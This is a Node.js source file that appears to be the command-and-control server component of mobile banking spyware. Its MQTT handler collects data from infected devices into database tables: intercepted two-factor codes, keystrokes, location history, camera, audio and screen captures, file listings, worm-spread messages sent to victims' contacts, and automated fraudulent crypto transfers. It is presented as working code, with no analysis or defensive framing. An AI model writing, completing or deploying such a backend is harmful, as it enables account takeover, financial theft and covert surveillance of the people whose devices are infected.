const db = require('./utils/db');

module.exports = function(mqttClient, logger) {
  mqttClient.on('connect', () => {
    logger.info('MQTT connected');
    mqttClient.subscribe('wuzen/devices/+/heartbeat', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/data', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/command_result', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/tfa', { qos: 2 });
    mqttClient.subscribe('wuzen/devices/+/keylog', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/location', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/camera', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/audio', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/screen', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/files', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/network', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/worm', { qos: 1 });
    mqttClient.subscribe('wuzen/devices/+/ats', { qos: 2 });
  });

  mqttClient.on('message', async (topic, message) => {
    try {
      const parts = topic.split('/');
      const deviceId = parts[2];
      const channel = parts[3];
      const payload = JSON.parse(message.toString());

      switch (channel) {
        case 'heartbeat':
          await db.query(
            `UPDATE devices SET last_seen = NOW(), battery_level = $1, status = 'online' WHERE device_id = $2`,
            [payload.battery, deviceId]
          );
          break;

        case 'data':
          // Generic data channel - route based on payload.type
          await handleGenericData(deviceId, payload);
          break;

        case 'tfa':
          await db.query(
            `INSERT INTO tfa_intercepts (device_id, code, source_app, source_number, message)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5)`,
            [deviceId, payload.code, payload.sourceApp, payload.sourceNumber, payload.message]
          );
          break;

        case 'ats':
          await db.query(
            `INSERT INTO ats_logs (device_id, target_app, amount, currency, wallet_address, status, transaction_hash)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7)`,
            [deviceId, payload.app, payload.amount, payload.currency, payload.wallet, payload.status, payload.txHash]
          );
          break;

        case 'worm':
          await db.query(
            `INSERT INTO worm_logs (device_id, target_contact, message_body, sent_via, status, sent_at)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6)`,
            [deviceId, payload.contact, payload.message, payload.via, payload.status, payload.sentAt]
          );
          break;

        case 'camera':
          // Binary data - store to MinIO, metadata to DB
          // payload contains minioKey reference
          await db.query(
            `INSERT INTO camera_snapshots (device_id, camera_type, minio_key, file_size, width, height)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6)`,
            [deviceId, payload.camera, payload.key, payload.size, payload.width, payload.height]
          );
          break;

        case 'audio':
          await db.query(
            `INSERT INTO audio_recordings (device_id, duration, minio_key, file_size, sample_rate, channels)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6)`,
            [deviceId, payload.duration, payload.key, payload.size, payload.sampleRate, payload.channels]
          );
          break;

        case 'screen':
          await db.query(
            `INSERT INTO screen_recordings (device_id, duration, minio_key, file_size, width, height, fps)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7)`,
            [deviceId, payload.duration, payload.key, payload.size, payload.width, payload.height, payload.fps]
          );
          break;

        case 'files':
          for (const file of payload.files) {
            await db.query(
              `INSERT INTO file_entries (device_id, path, name, type, size, permissions, modified_at, is_directory, parent_path)
               VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7, $8, $9)
               ON CONFLICT DO NOTHING`,
              [deviceId, file.path, file.name, file.type, file.size, file.perms,
               file.modified, file.isDir, file.parent]
            );
          }
          break;

        case 'network':
          await db.query(
            `INSERT INTO network_events (device_id, event_type, ssid, bssid, ip_address, gateway, dns_servers, is_vpn, is_proxy)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5::inet, $6::inet, $7, $8, $9)`,
            [deviceId, payload.type, payload.ssid, payload.bssid, payload.ip,
             payload.gateway, payload.dns, payload.isVpn, payload.isProxy]
          );
          break;

        case 'location':
          await db.query(
            `INSERT INTO location_history (device_id, latitude, longitude, altitude, accuracy, speed, bearing, provider)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7, $8)`,
            [deviceId, payload.lat, payload.lng, payload.alt, payload.accuracy,
             payload.speed, payload.bearing, payload.provider]
          );
          await db.query(
            `UPDATE devices SET latitude = $1, longitude = $2, accuracy = $3, location_updated = NOW()
             WHERE device_id = $4`,
            [payload.lat, payload.lng, payload.accuracy, deviceId]
          );
          break;

        case 'keylog':
          await db.query(
            `INSERT INTO keylogs (device_id, app_package, app_name, keystrokes, session_id)
             VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5)`,
            [deviceId, payload.appPackage, payload.appName, payload.keystrokes, payload.sessionId]
          );
          break;

        default:
          logger.info(`Unhandled MQTT channel: ${channel}`);
      }
    } catch (err) {
      logger.error('MQTT handler error:', err);
    }
  });

  mqttClient.on('error', (err) => {
    logger.error('MQTT error:', err);
  });
};

async function handleGenericData(deviceId, payload) {
  // Route to appropriate table based on payload.dataType
  const { dataType, data } = payload;
  // Implementation routes to DB tables
}
